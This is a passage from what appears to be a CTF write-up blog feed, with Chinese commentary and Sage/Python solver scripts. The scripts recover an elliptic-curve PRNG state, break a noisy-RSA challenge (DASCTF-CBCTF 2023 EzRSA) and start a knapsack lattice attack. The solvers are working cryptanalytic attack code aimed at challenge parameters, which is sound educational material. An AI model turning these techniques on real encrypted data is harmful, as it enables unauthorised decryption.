EllipticCurve<span class=\"token punctuation\">(</span>NIST_521_K<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>NIST_521_A<span class=\"token punctuation\">,</span> NIST_521_B<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>E2 <span class=\"token operator\">=</span> EllipticCurve<span class=\"token punctuation\">(</span>NIST_256_K<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>NIST_256_A<span class=\"token punctuation\">,</span> NIST_256_B<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>P <span class=\"token operator\">=</span> E2<span class=\"token punctuation\">(</span>P<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>Q <span class=\"token operator\">=</span> E2<span class=\"token punctuation\">(</span>Q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token keyword\">assert</span> x1 <span class=\"token operator\">==</span> x2</pre></td></tr><tr><td data-num=\"66\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>x1<span class=\"token punctuation\">.</span>nbits<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>rand1 <span class=\"token operator\">=</span> x1<span class=\"token operator\">>></span><span class=\"token punctuation\">(</span><span class=\"token number\">521</span><span class=\"token operator\">-</span><span class=\"token number\">240</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>rand2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>x1<span class=\"token operator\">>></span><span class=\"token punctuation\">(</span><span class=\"token number\">521</span><span class=\"token operator\">-</span><span class=\"token number\">480</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">240</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token comment\">#print(rand2.bit_length())</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre><span class=\"token comment\">#d = 31415926535</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>rand2<span class=\"token punctuation\">.</span>nbits<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>rand1 <span class=\"token operator\">=</span> rand1<span class=\"token operator\">&lt;&lt;</span><span class=\"token number\">16</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>lsb <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre><span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> tqdm<span class=\"token punctuation\">(</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>        seed <span class=\"token operator\">=</span> rand1<span class=\"token operator\">+</span>_</pre></td></tr><tr><td data-num=\"80\"></td><td><pre>        Q0 <span class=\"token operator\">=</span> E2<span class=\"token punctuation\">.</span>lift_x<span class=\"token punctuation\">(</span>seed<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>        state <span class=\"token operator\">=</span> ZZ<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>d<span class=\"token operator\">*</span>Q0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>xy<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>        r2 <span class=\"token operator\">=</span> ZZ<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>state<span class=\"token operator\">*</span>Q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>xy<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">>></span><span class=\"token number\">16</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>rand2<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>r2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>            lsb <span class=\"token operator\">=</span> _</pre></td></tr><tr><td data-num=\"85\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>    <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>        <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>seed <span class=\"token operator\">=</span> rand1<span class=\"token operator\">+</span>lsb</pre></td></tr><tr><td data-num=\"90\"></td><td><pre>Q0 <span class=\"token operator\">=</span> E2<span class=\"token punctuation\">.</span>lift_x<span class=\"token punctuation\">(</span>seed<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>state <span class=\"token operator\">=</span> ZZ<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>d<span class=\"token operator\">*</span>Q0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>xy<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre><span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>    state <span class=\"token operator\">=</span> ZZ<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>state<span class=\"token operator\">*</span>P<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>xy<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"97\"></td><td><pre>k <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre><span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"state\"</span><span class=\"token punctuation\">,</span> state<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>    state <span class=\"token operator\">=</span> ZZ<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>state<span class=\"token operator\">*</span>P<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>xy<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>    out <span class=\"token operator\">=</span> ZZ<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>state <span class=\"token operator\">*</span> Q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>xy<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">>></span><span class=\"token number\">16</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"out\"</span><span class=\"token punctuation\">,</span> out<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>    k <span class=\"token operator\">+=</span> out</pre></td></tr><tr><td data-num=\"104\"></td><td><pre>    k <span class=\"token operator\">=</span> k<span class=\"token operator\">&lt;&lt;</span><span class=\"token number\">240</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>k <span class=\"token operator\">=</span> k<span class=\"token operator\">>></span><span class=\"token number\">240</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>k <span class=\"token operator\">=</span> k<span class=\"token operator\">>></span><span class=\"token punctuation\">(</span><span class=\"token number\">240</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">-</span><span class=\"token number\">521</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>        <span class=\"token comment\">#print(k.bit_length())</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"109\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>emb_flag <span class=\"token operator\">=</span> E<span class=\"token punctuation\">(</span>emb_flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>M <span class=\"token operator\">=</span> inverse_mod<span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">,</span> NIST_521_ORDER<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>emb_flag</pre></td></tr><tr><td data-num=\"112\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>M<span class=\"token punctuation\">.</span>xy<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>m <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>M<span class=\"token punctuation\">.</span>xy<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>分类: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvY2F0ZWdvcnkvMjIwMjk5Ny5odG1s\">WriteUp</span></p>\n<p>标签: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvdGFnL2NyeXB0by8=\">crypto</span> , <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvdGFnL3dyaXRldXAv\">writeup</span></p>\n",
            "tags": []
        },
        {
            "id": "http://waltcsz.github.io/2023/12/",
            "url": "http://waltcsz.github.io/2023/12/",
            "title": "",
            "date_published": "2023-12-05T15:23:40.691Z",
            "content_html": "<h1 id=\"dasctf-cbctf-2023\"><a class=\"markdownIt-Anchor\" href=\"#dasctf-cbctf-2023\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvYXJ0aWNsZXMvMTc3ODAyMTYuaHRtbA==\"> DASCTF-CBCTF 2023</span></h1>\n<p>0rays 的师傅出的题，学习了。</p>\n<h2 id=\"ezrsa\"><a class=\"markdownIt-Anchor\" href=\"#ezrsa\">#</a> EzRSA</h2>\n<p>看到雅可比符号基本上就猜测是老套路了，然后还有个 rsa 的相关攻击。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> gmpy2 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>n1 <span class=\"token operator\">=</span> <span class=\"token number\">65634094430927080732256164808833233563732628654160389042977689628512527168256899310662239009610512772020503283842588142453533499954947692968978190310627721338357432052800695091789711809256924541784954080619073213358228083200846540676931341013554634493581962527475555869292091755676130810562421465063412235309</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>n2 <span class=\"token operator\">=</span> <span class=\"token number\">103670293685965841863872863719573676572683187403862749665555450164387906552249974071743238931253290278574192713467491802940810851806104430306195931179902098180199167945649526235613636163362672777298968943319216325949503045377100235181706964846408396946496139224344270391027205106691880999410424150216806861393</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">(</span>e1<span class=\"token punctuation\">,</span> noise1<span class=\"token punctuation\">,</span> c1<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1743</span><span class=\"token punctuation\">,</span> <span class=\"token number\">44560588075773853612820227436439937514195680734214431948441190347878274184937952381785302837541202705212687700521129385632776241537669208088777729355349833215443048466316517110778502508209433792603420158786772339233397583637570006255153020675167597396958251208681121668808253767520416175569161674463861719776</span><span class=\"token punctuation\">,</span> <span class=\"token number\">65643009354198075182587766550521107063140340983433852821580802983736094225036497335607400197479623208915379722646955329855681601551282788854644359967909570360251550766970054185510197999091645907461580987639650262519866292285164258262387411847857812391136042309550813795587776534035784065962779853621152905983</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">(</span>e2<span class=\"token punctuation\">,</span> noise2<span class=\"token punctuation\">,</span> c2<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1325</span><span class=\"token punctuation\">,</span> <span class=\"token number\">35282006599813744140721262875292395887558561517759721467291789696459426702600397172655624765281531167221787036009507833425145071265739486735993631460189629709591456017092661028839951392247601628468621576100035700437892164435424035004463142959219067199451575338270613300215815894328788753564798153516122567683</span><span class=\"token punctuation\">,</span> <span class=\"token number\">50327632090778183759544755226710110702046850880299488259739672542025916422119065179822210884622225945376465802069464782311211031263046593145733701591371950349735709553105217501410716570601397725812709771348772095131473415552527749452347866778401205442409443726952960806789526845194216490544108773715759733714</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">124349762993424531697403299350944207725577290992189948388824124986066269514204313888980321088629462472088631052329128042837153718129149149661961926557818023704330462282009415874674794190206220980118413541269327644472633791532767765585035518183177197863522573410860341245613331398610013697803459403446614221369</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    PR<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>x<span class=\"token operator\">>=</span>PolynomialRing<span class=\"token punctuation\">(</span>Zmod<span class=\"token punctuation\">(</span>n2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    g1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>x<span class=\"token operator\">+</span>noise1<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> e1 <span class=\"token operator\">-</span> c1</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    g2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>x<span class=\"token operator\">+</span>noise2<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> e2 <span class=\"token operator\">-</span> c2</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">gcd</span><span class=\"token punctuation\">(</span>g1<span class=\"token punctuation\">,</span> g2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">while</span> g2<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            g1<span class=\"token punctuation\">,</span> g2 <span class=\"token operator\">=</span> g2<span class=\"token punctuation\">,</span> g1 <span class=\"token operator\">%</span> g2</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">return</span> g1<span class=\"token punctuation\">.</span>monic<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span>gcd<span class=\"token punctuation\">(</span>g1<span class=\"token punctuation\">,</span> g2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>q <span class=\"token operator\">=</span> attack<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>enc <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>enc <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> enc<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> enc<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">if</span> kronecker<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span>n1<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        p <span class=\"token operator\">=</span> <span class=\"token string\">'1'</span> <span class=\"token operator\">+</span> p</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        p <span class=\"token operator\">=</span> <span class=\"token string\">'0'</span> <span class=\"token operator\">+</span> p</pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>q <span class=\"token operator\">=</span> <span class=\"token number\">13189337905641321257372188436353844418280745284875462357019668708167547026960641869513283218672677712590326347601424108528959315675307896082223561007980457</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token number\">9473204278465588641589315677772678997836862033858760337441231265335880892205102590571357305720744128962068300763212493598006400853597404586755248901932203</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>d <span class=\"token operator\">=</span> inverse<span class=\"token punctuation\">(</span><span class=\"token number\">65537</span><span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>ZZ<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>p<span class=\"token operator\">*</span>q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"cb-backpack\"><a class=\"markdownIt-Anchor\" href=\"#cb-backpack\">#</a> CB backpack</h2>\n<p>出题人的本意是考察<a href=\"https://github.com/FloydZ/Improving-ISD-in-Theory-and-Practice\"> New Time-Memory Trade-Offs for Subset Sum –<br>\nImproving ISD in Theory and Practice</a> 这个 paper 的内容，但因为数据给的不够大可以用爆破加背包格来做。<br>\n具体来说，总的未知比特是 48，参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2p2ZHNuL2NyeXB0by1hdHRhY2tzL2Jsb2IvbWFzdGVyL2F0dGFja3Mva25hcHNhY2svbG93X2RlbnNpdHkucHk=\"> jvdsn</span> 可计算密度大致是 1. 几，尝试爆 16 位，再测一下密度，发现只有 0.6 几，妥妥够了：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> math <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>a <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">65651991706497</span><span class=\"token punctuation\">,</span> <span class=\"token number\">247831871690373</span><span class=\"token punctuation\">,</span> <span class=\"token number\">120247087605020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">236854536567393</span><span class=\"token punctuation\">,</span> <span class=\"token number\">38795708921144</span><span class=\"token punctuation\">,</span> <span class=\"token number\">256334857906663</span><span class=\"token punctuation\">,</span> <span class=\"token number\">120089773523233</span><span class=\"token punctuation\">,</span> <span class=\"token number\">165349388120302</span><span class=\"token punctuation\">,</span> <span class=\"token number\">123968326805899</span><span class=\"token punctuation\">,</span> <span class=\"token number\">79638234559694</span><span class=\"token punctuation\">,</span> <span class=\"token number\">259559389823590</span><span class=\"token punctuation\">,</span> <span class=\"token number\">256776519514651</span><span class=\"token punctuation\">,</span> <span class=\"token number\">107733244474073</span><span class=\"token punctuation\">,</span> <span class=\"token number\">216508566448440</span><span class=\"token punctuation\">,</span> <span class=\"token number\">39327578905012</span><span class=\"token punctuation\">,</span> <span class=\"token number\">118682486932022</span><span class=\"token punctuation\">,</span> <span class=\"token number\">263357223061004</span><span class=\"token punctuation\">,</span> <span class=\"token number\">132872609024098</span><span class=\"token punctuation\">,</span> <span class=\"token number\">44605761726563</span><span class=\"token punctuation\">,</span> <span class=\"token number\">24908360451602</span><span class=\"token punctuation\">,</span> <span class=\"token number\">237906955893793</span><span class=\"token punctuation\">,</span> <span class=\"token number\">204469770496199</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7055254513808</span><span class=\"token punctuation\">,</span> <span class=\"token number\">221802659519968</span><span class=\"token punctuation\">,</span> <span class=\"token number\">169686619990988</span><span class=\"token punctuation\">,</span> <span class=\"token number\">23128789035141</span><span class=\"token punctuation\">,</span> <span class=\"token number\">208847144870760</span><span class=\"token punctuation\">,</span> <span class=\"token number\">272339624469135</span><span class=\"token punctuation\">,</span> <span class=\"token number\">269511404473473</span><span class=\"token punctuation\">,</span> <span class=\"token number\">112830627321371</span><span class=\"token punctuation\">,</span> <span class=\"token number\">73203551744776</span><span class=\"token punctuation\">,</span> <span class=\"token number\">42843503010671</span><span class=\"token punctuation\">,</span> <span class=\"token number\">118193938825623</span><span class=\"token punctuation\">,</span> <span class=\"token number\">49625220390324</span><span class=\"token punctuation\">,</span> <span class=\"token number\">230439888723036</span><span class=\"token punctuation\">,</span> <span class=\"token number\">241486656550572</span><span class=\"token punctuation\">,</span> <span class=\"token number\">107149406378865</span><span class=\"token punctuation\">,</span> <span class=\"token number\">233503862264755</span><span class=\"token punctuation\">,</span> <span class=\"token number\">269502011971514</span><span class=\"token punctuation\">,</span> <span class=\"token number\">181805192674559</span><span class=\"token punctuation\">,</span> <span class=\"token number\">152612003195556</span><span class=\"token punctuation\">,</span> <span class=\"token number\">184127512098087</span><span class=\"token punctuation\">,</span> <span class=\"token number\">165959151027513</span><span class=\"token punctuation\">,</span> <span class=\"token number\">188723045133473</span><span class=\"token punctuation\">,</span> <span class=\"token number\">241615906682300</span><span class=\"token punctuation\">,</span> <span class=\"token number\">216101484550038</span><span class=\"token punctuation\">,</span> <span class=\"token number\">81190147709444</span><span class=\"token punctuation\">,</span> <span class=\"token number\">124498742419309</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>a <span class=\"token operator\">=</span> a<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>d <span class=\"token operator\">=</span> n <span class=\"token operator\">/</span> log2<span class=\"token punctuation\">(</span><span class=\"token builtin\">max</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>N <span class=\"token operator\">=</span> ceil<span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">/</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> sqrt<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">assert</span> d <span class=\"token operator\">&lt;</span> <span class=\"token number\">0.9408</span><span class=\"token punctuation\">,</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"Density should be less than 0.9408 but was </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>d<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.\"</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>然后就是经典背包格，在 ln3 师傅的主机上跑三四分钟就出了：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> tqdm <span class=\"token keyword\">import</span> tqdm</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>a<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">65651991706497</span><span class=\"token punctuation\">,</span> <span class=\"token number\">247831871690373</span><span class=\"token punctuation\">,</span> <span class=\"token number\">120247087605020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">236854536567393</span><span class=\"token punctuation\">,</span> <span class=\"token number\">38795708921144</span><span class=\"token punctuation\">,</span> <span class=\"token number\">256334857906663</span><span class=\"token punctuation\">,</span> <span class=\"token number\">120089773523233</span><span class=\"token punctuation\">,</span> <span class=\"token number\">165349388120302</span><span class=\"token punctuation\">,</span> <span class=\"token number\">123968326805899</span><span class=\"token punctuation\">,</span> <span class=\"token number\">79638234559694</span><span class=\"token punctuation\">,</span> <span class=\"token number\">259559389823590</span><span class=\"token 